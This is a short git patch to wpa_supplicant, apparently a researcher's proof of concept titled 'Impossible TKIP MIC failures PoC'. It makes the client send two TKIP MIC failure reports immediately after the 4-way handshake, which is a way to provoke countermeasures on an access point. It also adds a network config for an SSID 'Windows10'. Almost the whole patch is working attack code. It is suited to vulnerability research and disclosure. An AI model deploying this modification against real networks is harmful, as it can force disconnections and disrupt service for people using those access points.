@@ -1,0 +1,40 @@
+From ae94105a443bf6749eae2a409c7f80f4eeb6bf74 Mon Sep 17 00:00:00 2001
+From: Mathy <vanhoefm@users.noreply.github.com>
+Date: Tue, 18 Jul 2017 09:13:16 -0500
+Subject: [PATCH] Impossible TKIP MIC failures PoC
+
+---
+ src/rsn_supp/wpa.c          |    5 +++++
+ wpa_supplicant/network.conf |    4 ++++
+ 2 files changed, 9 insertions(+)
+ create mode 100644 wpa_supplicant/network.conf
+
+diff --git a/src/rsn_supp/wpa.c b/src/rsn_supp/wpa.c
+index 3c47879..e671b65 100644
+--- a/src/rsn_supp/wpa.c
++++ b/src/rsn_supp/wpa.c
+@@ -1305,6 +1305,11 @@ static void wpa_supplicant_process_3_of_4(struct wpa_sm *sm,
+ 			sm->cur_pmksa = sa;
+ 	}
+ 
++	// Message 4 was sent and keys have been installed
++	printf(">> %s: sending two MIC failure reports right after 4-way HS msg4\n", __FUNCTION__);
++	wpa_sm_key_request(sm, 1, 1);
++	wpa_sm_key_request(sm, 1, 1);
++
+ 	sm->msg_3_of_4_ok = 1;
+ 	return;
+ 
+diff --git a/wpa_supplicant/network.conf b/wpa_supplicant/network.conf
+new file mode 100644
+index 0000000..67b2092
+--- /dev/null
++++ b/wpa_supplicant/network.conf
+@@ -0,0 +1,4 @@
++network={
++	ssid="Windows10"
++	psk="valid_password"
++}
+-- 
+1.7.10.4
+
